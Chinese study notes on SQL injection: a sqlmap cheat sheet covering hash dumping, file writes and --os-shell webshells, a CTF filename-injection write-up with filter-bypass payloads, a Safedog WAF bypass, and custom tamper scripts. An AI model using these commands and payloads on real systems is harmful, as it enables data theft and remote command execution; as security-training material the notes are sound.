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)

#### sqlmap详解
###### 目标：
```
-u 目标URL
-m 后面接txt，包含多个URL，自动检测渗透
-r 后面接bp抓包保存为txt文件可以，以post请求方式，渗透
-d 直接连接数据库
-l 从burp代理日志的解析目标
-v 1~5 显示操作的详细过程程度
```
###### 请求：
```
--method=METHOD 指定是get方法还是post方法。
例： --method=GET --method=POST
--random-agent  使用随机user-agent进行测试。sqlmap有一个文件中储存了各种各样的user-agent，文件在sqlmap/txt/user-agent.txt 在level>=3时会检测user-agent注入。
--proxy=PROXY 指定一个代理。
例： --proxy="127.0.0.1:8080" 使用GoAgent代理。
```
###### 注入：
```
-p  测试参数
例：  sqlmap -r bp.txt -p "username"
--skip-static  跳过测试静态参数(有的时候注入有多个参数，那么有些无关紧要的参数修改后页面是没有变化的)
--no-cast  获取数据时，sqlmap会将所有数据转换成字符串，并用空格代替null。(这个在我们注入失败的时候偶尔会见到，提示尝试使用--no-cast)
--tamper=TAMPER 使用sqlmap自带的tamper，或者自己写的tamper，来混淆payload，通常用来绕过waf和ips。
--prefix=注入payload字符串前缀  有些奇葩闭合就可以绕过不用写tamper
例如：--prefix="))))'"
--suffix=注入payload字符串后缀
```

![[Pasted image 20231213095752.png]]
###### 暴力破解
```
  --common-tables        暴力破解表 
  --common-colomns       暴力破解列
  --common-files      	暴力破解文件
  --threads=5        多线程 1~10
```
###### 检测：
```text
--level=LEVEL  执行测试的等级（1-5，默认为1） 
--level=1 默认请求GET/POST 
--level=2 进行cookie测试注入 
--level=3 进行user-agent或referer测试注入 
--level=5 进行host测试注入

--risk=RISK  执行测试的风险（0-3，默认为1） 
risk 2：基于事件的测试;risk 3：or语句的测试;risk 4：update的测试
升高风险等级会增加数据被篡改的风险。  常用就是默认1
```
###### 枚举：
```text
-b, --banner        获取数据库管理系统的标识
--current-user      获取数据库管理系统当前用户
--current-db        获取数据库管理系统当前数据库
--hostname          获取数据库服务器的主机名称
--is-dba            检测DBMS当前用户是否DBA
--users             枚举数据库管理系统用户
--passwords         枚举数据库管理系统用户密码哈希
--privileges        枚举数据库管理系统用户的权限
--dbs              枚举数据库管理系统数据库
--tables           枚举DBMS数据库中的表
--columns          枚举DBMS数据库表列
-D                  要进行枚举的指定数据库名
-T                  要进行枚举的指定表名
-C                  要进行枚举的指定列名
--dump             转储数据库表项,查询字段值
--search           搜索列（S），表（S）和/或数据库名称（S）
--sql-query=QUERY   要执行的SQL语句
--sql-shell         提示交互式SQL的shell
```
###### 文件操作：
```text
--file-read=RFILE     从后端的数据库管理系统文件系统读取文件
--file-write=WFILE    编辑后端的数据库管理系统文件系统上的本地文件
--file-dest=DFILE     后端的数据库管理系统写入文件的绝对路径
例如：--file-write="/software/nc.exe"

```
###### 操作系统访问：
```text
--os-cmd=OSCMD      执行操作系统命令（OSCMD）
--os-shell          交互式的操作系统的shell
```
##### 写入webshell条件

1.MYSQL用secure_file_priv这个配置项来完成对数据导入导出的限制，  
如果secure_file_priv=NULL，MYSQL服务会禁止导入和导出操作。  
如果secure_file_priv=/tmp/，MYSQL服务只能在/tmp/目录下导入和导出  
如果secure_file_priv="" ，MYSQL服务导入和导出不做限制  
通过命令查看secure-file-priv的当前值，确定是否允许导入导出以及导出文件路径  
2.MYSQL中root用户拥有所有权限，但写入webshell并不需要一定是root用户权限，比如数据库用户只要拥有FILE权限就可以执行select into outfile操作  
3.当secure_file_priv文件导出路径与web目录路径重叠，写入webshell才可以被访问到  
简单点说就是  
==1.select into outfile方法可用（允许导出文件）  
2.我们需要知道网站所在的绝对路径  
3.我们要有足够的权限==
![[Pasted image 20231213100530.png]]
GET注入

```
sqlmap.py -u "url" 检测存在不存在注入

sqlmap.py -u "url" --tables    列出数据库的表

sqlmap.py -u "url" --columns -T admin    列出admin的内容

sqlmap.py -u "url" --dump -T admin "useradmin,password"    列出useradmin password的内容
```
##### **Request：可用于指定如何连接到目标url；**
```
  -A				 	HTTP用户代理头的值
  -H				 	额外的头 (例如：X-Forwarded-For: 127.0.0.1)
  --forms 				参数自动搜索表单
  --method=    		 	指定HTTP方法 (例如：GET/POST)
  --data=	         	通过POST发送的数据字符串 (例如：id=1)
  --cookie=    		 	HTTP Cookie头的值 (例如：PHPSESSID=a8d127e..)
  --random-agent     	使用随机选择的HTTP用户代理标头值
  --is-dba              检测是否DBA当前用户
  --host=           	HTTP主机头的值
  --referer=  			HTTP引用页头的值
  --headers=			额外的标题 (例如：Accept-Language: fr\nETag: 123)
  --ignore-timeouts   	忽略连接超时
  --proxy=		        使用一个代理连接到目标URL  //可以写bp的代理我们来学习sqlmap的操作之类的
  --delay=		        每个HTTP请求之间的延迟 (s)
  --timeout=   			超时连接前等待的秒数 (默认值30)
  --hpp               	使用HTTP参数污染的方法

```

==Techniques==：可用于调整特定SQL注入技术的测试；Techniques：可用于调整特定SQL注入技术的测试；

```
#sqlmap --technique 参数

B：布尔型注入

E：报错型注入

U：可联合查询注入

S：可多语句查询注入

T：基于时间延迟注入

Q：Inline queries (嵌套查询注入)

例如：--technique "U"

```

--dbms=”mysql”指定 mysql 数据库

--level=x  x是要指定的数

--os-cmd="net user"

交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径

下创建文件返回结果，然后再自动删除。

--os-shell

写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。

注意:关闭sqlmap文件就 会被删除。
###### User-Agent注入
```
python sqlmap.py -u "http://x.x.x.x/" --user-agent="*" --dbs
```
###### Referer注入
```
python sqlmap.py -u "http://x.x.x.x/" --referer="*" --dbs
```
###### X-Forwared-For注入
```python
python sqlmap.py -u "http://x.x.x.x/" --date="xxx" --header="X-Forwared-For:xxx" --dbs
```
###### COOKIE注入

测试发现

you have not declared cookie(s), while server wants to set its own ('PHPSESSID=7fe144f216d...14d1d99756;security=high;security=high'). Do you want to use those [Y/n] y

要登录，说明就加上cookie:

登录进去将cookie值和名字用等于号，两个就分号。

```
--cookie="security=low;PHPSESSID=48cd553d6c888553e76b1a1d6ba9078b"
```

HTTP Cookie在level为2的时候就会测试

HTTP User-Agent/Referer头在level为3的时候就会测试。

奇葩SQL注入

这题比较意外，不是上传题是sql注入而且还是文件名的SQL注入，

因为回显的只是文件名，然后它存入数据库的也可能是文件名，既然连接了数据库就可能存在注入漏洞。然后就能想到可能是文件名sql注入。

任何与数据库发生连接交互的地方都可能存在SQL注入！

然后就开始构造文件名的payload，首先介绍几个函数。

conv(N,from_base,to_base) conv函数接收一个数字，进行进制转换

N是指函数接受的数值，from_base是指这个数值原来的进制，to_base是指需要转化的进制。

Substr()

第一种：

SBUSTR(str,pos);

就是从pos开始的位置，一直截取到最后。

第二种：

SUBSTR(str,pos,len);

len指截取长度

这种表示的意思是，就是从pos开始的位置，截取len个字符(空白也算字符)。

需要注意的是：如果pos为1(而不是0)，表示从第一个位置开始

Hex()

这个函数就是把里面的参数转化成16进制。

接下来经过测试，题目过滤了select、from，使用selselctect和frfromom

sselectelect database() => 0

selecselectt substr(dAtabase(),1,12) => 0

selecselectt substr(hex(dAtabase()),1,12) => 7765625 这里正常应该显示7765625f7570才对，可能是题目的设置，出现字母以后后面内容就会被截断

所以才用到了CONV，将16进制转化为10进制，读取出来的数据都是十进制的，先转换成十六进制然后转换为字符

文件名 读取出来的十进制 对应字符

‘+(selselectect conv(substr(hex(database()),1,12),16,10))+’ 131277325825392 web_up

‘+(selselectect conv(substr(hex(database()),13,12),16,10))+’ 1819238756 load

即查出库名：web_upload

查表

这里表名比较长，所以我们分三次读取

'+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='web_upload' limit 1,1)),1,12),16,10))+'

上述payload返回：114784820031327 转换为字符： hello_

'+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='web_upload' limit 1,1)),13,12),16,10))+'

上述payload返回：112615676665705 转换为字符： flag_i

'+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='web_upload' limit 1,1)),25,12),16,10))+'

上述payload返回：126853610566245 转换为字符： s_here

拼接起来最终得到表名：hello_flag_is_here

查字段

这里查字段分两次

'+(seleselectct+conv(substr(hex((selselectect column_name frfromom information_schema.columns where table_name='hello_flag_is_here' limit 0,1)),1,12),16,10))+'

上述payload返回：115858377367398 转换为字符： i_am_f

'+(seleselectct+conv(substr(hex((selselectect column_name frfromom information_schema.columns where table_name='hello_flag_is_here' limit 0,1)),13,12),16,10))+'

上述payload返回：7102823 转换为字符： lag

拼接起来最终得到字段名：i_am_flag

查字段内容

分三次查

'+(seleselectct+conv(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+'

上述payload返回：36427215695199 转换为字符：!!@m

'+(seleselectct+conv(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+'

上述payload返回：92806431727430 转换为字符：Th.e_F

'+(seleselectct+conv(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+'

上述payload返回：560750951 转换为字符：!lag

综上所述字段内容为：!!_@m_Th.e_F!lag

#### 一、堆叠注入介绍

1、多条sql语句同时执行

2、union只能执行查询语句，堆叠可以执行增删改查

3、同时执行三条语句

select 1;select 2;select 3

原理在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入;
### 安全狗绕过
![[Pasted image 20231213180419.png]]
发现有空格就会报错，连注释符也不能代替空格，但是我们知道
```
/* */,中间可以放其他的特殊字符也可以实现代替空格
```
burp抓包发到爆破模块，==在and后面爆破==
![[Pasted image 20231213181053.png]]
选择burp的爆破模式，自定义字符和最小长度和最大长度
![[Pasted image 20231213180739.png]]
得到字符（//）![[Pasted image 20231213181130.png]]
成功绕过安全狗![[Pasted image 20231213181208.png]]


### 编写sqlmap的tamper脚本
为了认识tamper的结构，从最简单的例子开始。
```python
#例子
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOWEST

def dependencies():
	pass
def tamper(payload,**kwargs):
	return payload.replace("'","\\'").replace(""","\\"")
```
个最小的tamper脚本结构为priority变量定义和dependencies、tamper函数定义。
1. ==priority定义脚本的优先级==，用于多个tamper脚本的时候，如果加载多个谁优先级高就先执行哪个,从高到低：(HIGHEST>HIGHER>HIGH>NORMAL>LOW>LOWEST)
2. ==dependencies()函数表示可以适用的范围==，可以为空
3. ==tamper()是主要函数，接受值为payload和** kwargs==，返回值就是修改替换后的payload内容，比如上面就是把'替换成\\',。==payload接收的是sqlmap进行自动注入时候的语句，要替换成payload完成绕过==。kwargs是修改http头里的内容函数。
![[Pasted image 20231211202708.png]]
==把这个文件拷贝到sqlmap的tamper目录==下重名名为doublewords.py

```
测试语句:sqlmap -u "网站" --random-agent --tamper=doublewords -o
```
sqlmap中无双写注入的脚本，所以我编写了一个**tamper**，可以根据测出的被ban的关键词进行修改,因为sqlmap喜欢用大写所以我们就用lower()给转换为小写：
```python
#!/usr/bin/env python
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
        pass

def tamper(payload,**kwargs):
    if payload:
        payload = payload.lower()
        payload = payload.replace("union","ununionion")
        payload = payload.replace("or","oorr")

    return payload


```
##### sqlmap自带脚本：
SQLMap的脚本都存放在安装目录的tamper文件夹中
[sqlmap的使用 ---- 自带绕过脚本tamper_sqlmap 单引号-CSDN博客⁤](https://blog.csdn.net/qq_34444097/article/details/82717357)

|脚本名称|作用说明|
|---|---|
|apostrophemask.py|将引号替换成UTF-8，用于过滤单引号|
|base64encode.py|替换成base64编码|
|multiplespaces.py|围绕SQL关键字添加多个空格|
|space2plus.py|用+号代替空格|
|nonrecursivereplacement.py|作为双重查询语句，双写绕过，用双重语句替换预定义的SQL关键字|
|space2randomblank.py|将空格替换为其他有效字符|
|unionalltounion.py|将union all select 替换成union select|
|securesphere.py|追加特制的字符串|
|space2hash.py|将空格替换为#号，并添加一个随机字符串和换行符|
|space2mssqlblank.py(mssql)|将空格替换成其他空符号|
|space2mssqlhash.py|将空格替换为#号，并添加一个换行符|
|between.py|用not between 0 and替换大于号，用between and替换等于号|
|percentage.py|ASP允许每个字符前面添加%号|
|sp_password.py|从DBMS日志的自动模糊处理的有效载荷追加sp_password|
|charencode.py|对给定的payload全部字符使用URL编码|
|randomcase.py|随机大小写|
|charunicodeencode.py|字符串Unicode编码|
|space2comment.py|将空格替换成/* * /|
|equaltolike.py|将等号替换为like|
|greatest.py|绕过对大于号的过滤，用GREATEST替换大于号|
|ifnull2ifsnull.py|绕过对ifnull的过滤，替换类似IFNULL(A,B)为IF(ISNULL(A),B,A)|
|modsecurityversioned.py|过滤空格，使用MySQL内联注释的方式进行注入|
|space2mysqlblank.py|将空格替换为其他空白符号(适用于MySQL)|
|modsecurityzeroversioned.py|使用MySQL内联注释的方式进行注入|
|space2mysqlhash.py|将空格替换为–，并添加一个换行符|
|bluecoat.py|在SQL语句之后用有效的随机空白替换空格符，随后用like替换等于号|
|versionedkeywords.py|注释绕过|
|halfversionedmorekeywords.py|当数据库为MySQL时绕过防火墙，在每个关键字之前添加MySQL版本注释|
|space2moreshash.py|将空格替换为#号，并添加一个随机字符串和换行符|
|apostrphenullencode.py|用非法双字节Unicode字符替换单引号|
|appendnullbyte.py|在有效负荷的结束位置加载零字节字符编码|
|chardoubleencode.py|对给定的payload全部字符使用双重url编码|
|unmagicquotes.py|宽字节注入，用一个多字节组合和末尾通用注释一起替换空格|
|randomcomments.py|用/* */分割SQL关键字|

使用方法：
```
sqlmap -u [url] --tamper [模块名]
```
